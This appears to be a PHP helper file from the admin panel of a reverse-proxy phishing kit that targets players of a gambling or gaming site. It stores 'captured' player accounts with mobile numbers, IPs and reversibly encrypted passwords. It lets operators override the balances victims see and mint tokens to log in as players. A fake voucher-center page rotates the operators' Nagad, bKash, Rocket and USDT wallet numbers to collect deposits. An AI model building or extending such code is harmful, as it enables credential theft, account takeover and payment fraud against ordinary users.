<?php
/**
 * Storage + auth helpers for the admin panel.
 * JSON stores live in /data (denied from the web by data/.htaccess).
 */

require_once dirname(__DIR__) . '/cache-guard.php'; // cache deny rule + the purge that spares it

function data_dir(): string
{
    return dirname(__DIR__) . '/data';
}

function store_write(string $file, $data): bool
{
    $dir = data_dir();
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    if ($json === false) {
        return false;
    }
    $tmp = $file . '.tmp';
    if (@file_put_contents($tmp, $json) === false) {
        return false;
    }
    return @rename($tmp, $file);
}

function store_read(string $file): array
{
    if (!is_file($file)) {
        return [];
    }
    $d = json_decode((string) @file_get_contents($file), true);
    return is_array($d) ? $d : [];
}

/* --------------------------- content --------------------------- */

/** Default payment channel list (used per method unless overridden). */
function voucher_channel_defaults(): array
{
    return [
        ['label' => 'চ্যানেল 3', 'enabled' => true],
        ['label' => 'চ্যানেল 1', 'enabled' => true],
        ['label' => 'চ্যানেল 75', 'enabled' => true],
        ['label' => 'চ্যানেল 86', 'enabled' => true],
    ];
}

/** Default payment methods shown on the custom voucher-center page. */
function voucher_method_defaults(): array
{
    $ch = voucher_channel_defaults();
    return [
        'NAGAD'   => ['name' => 'Nagad',            'image' => '', 'enabled' => true, 'min' => 100, 'max' => 30000, 'channels' => $ch],
        'BKASH'   => ['name' => 'Bkash',            'image' => '', 'enabled' => true, 'min' => 100, 'max' => 30000, 'channels' => $ch],
        'BKASHSM' => ['name' => 'Send Money Bkash', 'image' => '', 'enabled' => true, 'min' => 100, 'max' => 30000, 'channels' => $ch],
        'NAGADSM' => ['name' => 'Send Money Nagad', 'image' => '', 'enabled' => true, 'min' => 100, 'max' => 30000, 'channels' => $ch],
        'USDT'    => ['name' => 'USDT',             'image' => '', 'enabled' => true, 'min' => 100, 'max' => 30000, 'channels' => $ch],
        'ROCKET'  => ['name' => 'Rocket',           'image' => '', 'enabled' => true, 'min' => 100, 'max' => 30000, 'channels' => $ch],
    ];
}

/** Default configuration for the custom voucher-center page. */
function voucher_defaults(): array
{
    return [
        'enabled'      => false,
        'path'         => '/m/voucherCenter',
        'redirect_url' => '/voucherCenter/',
        'logo'         => '',
        'amounts'      => [100, 200, 300, 500, 1000, 3000, 5000, 10000, 30000],
        'methods'      => voucher_method_defaults(),
    ];
}

function content_defaults(): array
{
    return [
        'banners' => [],
        'marquee' => ['enabled' => false, 'items' => [], 'text' => '', 'bg' => '#111827', 'color' => '#ffffff', 'speed' => 160, 'link' => ''],
        'titles'  => ['web_title' => '', 'mobile_title' => '', 'app_name' => ''],
        'logo'    => ['url' => '', 'width' => 0],
        'favicon' => ['url' => ''],
        'voucher' => voucher_defaults(),
    ];
}

function content_load(): array
{
    $d = store_read(data_dir() . '/content.json');
    $def = content_defaults();
    $out = $def;
    foreach ($def as $k => $v) {
        if (isset($d[$k]) && is_array($d[$k])) {
            $out[$k] = array_merge($v, $d[$k]);
        }
    }
    if (!empty($d['banners']) && is_array($d['banners'])) {
        $out['banners'] = array_values($d['banners']);
    }
    // Marquee: normalise to a list of {text, link}. Migrate the old single-text format.
    $mq = $out['marquee'];
    if (empty($mq['items']) || !is_array($mq['items'])) {
        $t = trim((string) ($mq['text'] ?? ''));
        $mq['items'] = $t !== '' ? [['text' => $t, 'link' => (string) ($mq['link'] ?? '')]] : [];
        if ($t !== '' && (int) ($mq['speed'] ?? 0) < 40) {
            $mq['speed'] = 160; // old "seconds" value -> new px/s default
        }
    } else {
        $mq['items'] = array_values(array_filter($mq['items'], function ($x) {
            return is_array($x) && trim((string) ($x['text'] ?? '')) !== '';
        }));
    }
    $out['marquee'] = $mq;
    return $out;
}

function content_save(array $c): bool
{
    return store_write(data_dir() . '/content.json', $c);
}

/* ---------------------------- users ---------------------------- */

function users_load(): array
{
    return array_values(store_read(data_dir() . '/users.json'));
}

function users_save(array $users): bool
{
    return store_write(data_dir() . '/users.json', array_values($users));
}

/** Create users.json from the setup config the first time it is needed. */
function users_seed(array $cfg): void
{
    if (is_file(data_dir() . '/users.json')) {
        return;
    }
    users_save([[
        'id'        => 1,
        'username'  => (string) ($cfg['user'] ?? 'admin'),
        'pass_hash' => (string) ($cfg['pass_hash'] ?? ''),
        'role'      => 'owner',
        'created'   => date('c'),
    ]]);
}

function users_next_id(array $users): int
{
    $max = 0;
    foreach ($users as $u) {
        $max = max($max, (int) ($u['id'] ?? 0));
    }
    return $max + 1;
}

function user_verify(array $users, string $username, string $password): ?array
{
    foreach ($users as $u) {
        if (hash_equals((string) ($u['username'] ?? ''), $username)
            && password_verify($password, (string) ($u['pass_hash'] ?? ''))) {
            return $u;
        }
    }
    return null;
}

/* --------------------------- config ---------------------------- */

function config_load(): array
{
    $f = dirname(__DIR__) . '/config.php';
    return is_file($f) ? (require $f) : [];
}

function config_save(array $cfg): bool
{
    $body = "<?php\n"
        . "/**\n"
        . " * Proxy configuration. Generated/updated by the admin panel / setup installer.\n"
        . " */\n\n"
        . 'return ' . var_export($cfg, true) . ";\n";
    $f = dirname(__DIR__) . '/config.php';
    $tmp = $f . '.tmp';
    if (@file_put_contents($tmp, $body) === false) {
        return false;
    }
    return @rename($tmp, $f);
}

/* ----------------------- orders / payments ----------------------- */

function orders_read(): array
{
    $d = store_read(data_dir() . '/orders.json');
    return $d['orders'] ?? [];
}

function orders_write(array $orders): bool
{
    $d = store_read(data_dir() . '/orders.json');
    $d['orders'] = $orders;
    if (!empty($orders)) {
        $maxId = max(array_column($orders, 'id'));
        $d['nextId'] = max($d['nextId'] ?? 1001, $maxId + 1);
    }
    return store_write(data_dir() . '/orders.json', $d);
}

function orders_next_id(): int
{
    $d = store_read(data_dir() . '/orders.json');
    return ($d['nextId'] ?? 1001);
}

function find_order_by_tracking(string $trackingNumber): ?array
{
    $orders = orders_read();
    foreach ($orders as $order) {
        if (($order['trackingNumber'] ?? '') === $trackingNumber) {
            return $order;
        }
    }
    return null;
}

function update_order(string $trackingNumber, array $updates): bool
{
    $orders = orders_read();
    foreach ($orders as &$order) {
        if (($order['trackingNumber'] ?? '') === $trackingNumber) {
            $order = array_merge($order, $updates);
            return orders_write($orders);
        }
    }
    return false;
}

function payment_methods_data_read(): array
{
    $d = store_read(data_dir() . '/payment-methods.json');
    return is_array($d) ? $d : [];
}

function payment_methods_data_write(array $data): bool
{
    return store_write(data_dir() . '/payment-methods.json', $data);
}

function payment_rotation_read(): array
{
    $d = store_read(data_dir() . '/payment-rotation.json');
    return is_array($d) ? $d : [];
}

function payment_rotation_write(array $data): bool
{
    return store_write(data_dir() . '/payment-rotation.json', $data);
}

/**
 * Round-robin picker for wallet numbers when multiple enabled accounts
 * share the same method+channel. Bumps the counter atomically with flock.
 * Returns the next eligible index [0..count-1].
 */
function payment_rotation_next(string $key, int $count): int
{
    if ($count <= 1) {
        return 0;
    }
    $file = data_dir() . '/payment-rotation.json';
    $dir = data_dir();
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    $fh = @fopen($file, 'c+');
    if (!$fh) {
        $d = payment_rotation_read();
        $last = (int) ($d[$key] ?? -1);
        $next = ($last + 1) % $count;
        $d[$key] = $next;
        payment_rotation_write($d);
        return $next;
    }
    $locked = @flock($fh, LOCK_EX);
    $size = @filesize($file);
    $d = [];
    if ($size > 0) {
        @rewind($fh);
        $content = @fread($fh, $size);
        $decoded = json_decode((string) $content, true);
        if (is_array($decoded)) {
            $d = $decoded;
        }
    }
    $last = (int) ($d[$key] ?? -1);
    $next = ($last + 1) % $count;
    $d[$key] = $next;
    $json = json_encode($d, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    if ($json !== false) {
        @ftruncate($fh, 0);
        @rewind($fh);
        @fwrite($fh, $json);
        @fflush($fh);
    }
    if ($locked) {
        @flock($fh, LOCK_UN);
    }
    @fclose($fh);
    return $next;
}

function payment_rotation_peek(string $key, int $count): int
{
    if ($count <= 1) {
        return 0;
    }
    $d = payment_rotation_read();
    $last = (int) ($d[$key] ?? -1);
    return ($last + 1) % $count;
}

function payment_settings_read(): array
{
    $d = store_read(data_dir() . '/settings.json');
    return is_array($d) ? $d : [];
}

function payment_settings_write(array $data): bool
{
    return store_write(data_dir() . '/settings.json', $data);
}

/* --------------------------- players --------------------------- */

function players_file(): string
{
    return data_dir() . '/players.json';
}

/**
 * Atomic read-modify-write for any JSON store: exclusive lock, re-read inside
 * the lock, then store_write()'s tmp+rename. Concurrent writers cannot lose
 * each other's rows.
 */
function store_update(string $file, callable $mutator): bool
{
    $dir = data_dir();
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    $lock = @fopen($file . '.lock', 'c');
    $locked = $lock ? @flock($lock, LOCK_EX) : false;
    $data = store_read($file);
    $data = $mutator($data);
    $ok = store_write($file, $data);
    if ($locked) {
        @flock($lock, LOCK_UN);
    }
    if ($lock) {
        @fclose($lock);
    }
    return $ok;
}

function players_load(): array
{
    $d = store_read(players_file());
    return array_values($d);
}

function players_save(array $players): bool
{
    return store_write(players_file(), array_values($players));
}

function players_next_id(array $players): int
{
    $max = 0;
    foreach ($players as $p) {
        $max = max($max, (int) ($p['id'] ?? 0));
    }
    return $max + 1;
}

/**
 * Insert or update one player, deduped by username (case-insensitive).
 * Recognised $patch keys: username (required), mobile_raw, mobile_suffixed,
 * pass_hash, vault, vip, balance, last_login_at, last_ip, user_agent, source.
 * Null/empty values never erase an existing value.
 */
function players_upsert(array $patch): bool
{
    $username = trim((string) ($patch['username'] ?? ''));
    if ($username === '') {
        return false;
    }
    return store_update(players_file(), function (array $players) use ($username, $patch) {
        $idx = -1;
        foreach ($players as $i => $p) {
            if (strcasecmp((string) ($p['username'] ?? ''), $username) === 0) {
                $idx = $i;
                break;
            }
        }
        $now = date('c');
        $fields = ['mobile_raw', 'mobile_suffixed', 'pass_hash', 'vault', 'vip', 'balance',
            'last_login_at', 'last_ip', 'user_agent', 'source'];
        if ($idx < 0) {
            $players[] = [
                'id'               => players_next_id($players),
                'username'         => $username,
                'mobile_raw'       => (string) ($patch['mobile_raw'] ?? ''),
                'mobile_suffixed'  => (string) ($patch['mobile_suffixed'] ?? ''),
                'pass_hash'        => (string) ($patch['pass_hash'] ?? ''),
                'vault'            => $patch['vault'] ?? null,
                'vip'              => (string) ($patch['vip'] ?? 'VIP0'),
                'balance'          => $patch['balance'] ?? 0,
                'vip_override'     => null,
                'balance_override' => null,
                'note'             => '',
                'created_at'       => $now,
                'last_login_at'    => (string) ($patch['last_login_at'] ?? ''),
                'last_ip'          => (string) ($patch['last_ip'] ?? ''),
                'user_agent'       => (string) ($patch['user_agent'] ?? ''),
                'source'           => (string) ($patch['source'] ?? 'captured'),
            ];
        } else {
            $row = $players[$idx];
            foreach ($fields as $k) {
                $v = $patch[$k] ?? null;
                if ($v !== null && $v !== '') {
                    $row[$k] = $v;
                }
            }
            if (empty($row['created_at'])) {
                $row['created_at'] = $now;
            }
            foreach (['vip' => 'VIP0', 'balance' => 0, 'note' => '', 'source' => 'captured'] as $k => $d) {
                if (!array_key_exists($k, $row)) {
                    $row[$k] = $d;
                }
            }
            $players[$idx] = $row;
        }
        return $players;
    });
}

/** Update a player's admin-editable fields (overrides/note). */
function player_set_overrides(string $username, array $changes): bool
{
    $username = trim($username);
    if ($username === '') {
        return false;
    }
    return store_update(players_file(), function (array $players) use ($username, $changes) {
        foreach ($players as &$p) {
            if (strcasecmp((string) ($p['username'] ?? ''), $username) === 0) {
                foreach (['vip_override', 'balance_override', 'note'] as $k) {
                    if (array_key_exists($k, $changes)) {
                        $p[$k] = $changes[$k];
                    }
                }
                break;
            }
        }
        unset($p);
        return $players;
    });
}

function player_effective_vip(array $p): string
{
    $o = $p['vip_override'] ?? null;
    return ($o !== null && $o !== '') ? (string) $o : (string) ($p['vip'] ?? 'VIP0');
}

function player_effective_balance(array $p)
{
    $o = $p['balance_override'] ?? null;
    return ($o !== null && $o !== '') ? $o : ($p['balance'] ?? 0);
}

/* ---------------------------- vault ---------------------------- */

function player_vault_key(): string
{
    $cfg = config_load();
    $key = trim((string) ($cfg['player_vault_key'] ?? ''));
    if ($key === '') {
        $key = bin2hex(random_bytes(32));
        $cfg['player_vault_key'] = $key;
        config_save($cfg);
    }
    return $key;
}

function capture_secret(): string
{
    $cfg = config_load();
    $s = trim((string) ($cfg['capture_secret'] ?? ''));
    if ($s === '') {
        $s = bin2hex(random_bytes(32));
        $cfg['capture_secret'] = $s;
        config_save($cfg);
    }
    return $s;
}

/** AES-256-GCM. Returns a self-describing blob, or null on failure. */
function vault_encrypt(string $plain): ?array
{
    if ($plain === '') {
        return null;
    }
    $key = @hex2bin(player_vault_key());
    if ($key === false || strlen($key) < 32) {
        return null;
    }
    $iv = random_bytes(12);
    $tag = '';
    $ct = openssl_encrypt($plain, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
    if ($ct === false) {
        return null;
    }
    return ['v' => 1, 'iv' => base64_encode($iv), 'tag' => base64_encode($tag), 'ct' => base64_encode($ct)];
}

function vault_decrypt($v): ?string
{
    if (!is_array($v) || empty($v['ct']) || empty($v['iv'])) {
        return null;
    }
    $key = @hex2bin(player_vault_key());
    if ($key === false || strlen($key) < 32) {
        return null;
    }
    $pt = openssl_decrypt(
        base64_decode((string) $v['ct']),
        'aes-256-gcm',
        $key,
        OPENSSL_RAW_DATA,
        base64_decode((string) $v['iv']),
        base64_decode((string) ($v['tag'] ?? ''))
    );
    return $pt === false ? null : $pt;
}

/* ------------------------- login tokens ------------------------- */

function player_tokens_file(): string
{
    return data_dir() . '/player_login_tokens.json';
}

function player_tokens_prune(array $tokens): array
{
    $cutoff = time() - 3600;
    return array_values(array_filter($tokens, function ($t) use ($cutoff) {
        return is_array($t) && (int) ($t['expires_ts'] ?? 0) >= $cutoff;
    }));
}

function player_token_mint(string $username, string $createdBy, string $ip, int $ttl = 60): array
{
    $row = [
        'token'      => bin2hex(random_bytes(32)),
        'username'   => $username,
        'expires_ts' => time() + $ttl,
        'used'       => false,
        'created_by' => $createdBy,
        'ip'         => $ip,
        'created_at' => date('c'),
    ];
    store_update(player_tokens_file(), function (array $tokens) use ($row) {
        $tokens[] = $row;
        return player_tokens_prune($tokens);
    });
    return $row;
}

/**
 * Consume a token exactly once. Returns the token row on success, null on
 * unknown / already-used / expired. The check+mark runs inside the store lock,
 * so two concurrent clicks cannot both win.
 */
function player_token_burn(string $token): ?array
{
    if ($token === '') {
        return null;
    }
    $found = null;
    store_update(player_tokens_file(), function (array $tokens) use ($token, &$found) {
        foreach ($tokens as &$t) {
            if (is_array($t) && hash_equals((string) ($t['token'] ?? ''), $token)) {
                if (empty($t['used']) && (int) ($t['expires_ts'] ?? 0) >= time()) {
                    $t['used'] = true;
                    $t['used_at'] = date('c');
                    $found = $t;
                }
                break;
            }
        }
        unset($t);
        return $tokens;
    });
    return $found;
}

/* ----------------------------- audit ----------------------------- */

function admin_audit_append(array $entry): void
{
    $entry['ts'] = date('c');
    store_update(data_dir() . '/admin_audit.json', function ($log) use ($entry) {
        if (!is_array($log)) {
            $log = [];
        }
        $log[] = $entry;
        if (count($log) > 2000) {
            $log = array_slice($log, -2000);
        }
        return $log;
    });
}

/* --------------------------- rate limit --------------------------- */

/** True while the request is allowed; false once the window is saturated. */
function rate_limit_hit(string $key, int $max, int $window): bool
{
    $allowed = true;
    store_update(data_dir() . '/rate-limit.json', function ($data) use ($key, $max, $window, &$allowed) {
        if (!is_array($data)) {
            $data = [];
        }
        $now = time();
        $bucket = array_values(array_filter((array) ($data[$key] ?? []), function ($t) use ($now, $window) {
            return (int) $t > $now - $window;
        }));
        if (count($bucket) >= $max) {
            $allowed = false;
        } else {
            $bucket[] = $now;
        }
        $data[$key] = $bucket;
        return $data;
    });
    return $allowed;
}

/* --------------------------- capture nonce --------------------------- */

function capture_nonce(): string
{
    return substr(hash_hmac('sha256', 'capture:' . date('Y-m-d'), capture_secret()), 0, 32);
}

function capture_nonce_ok(string $given): bool
{
    if ($given === '') {
        return false;
    }
    foreach ([date('Y-m-d'), date('Y-m-d', time() - 86400)] as $d) {
        $expected = substr(hash_hmac('sha256', 'capture:' . $d, capture_secret()), 0, 32);
        if (hash_equals($expected, $given)) {
            return true;
        }
    }
    return false;
}
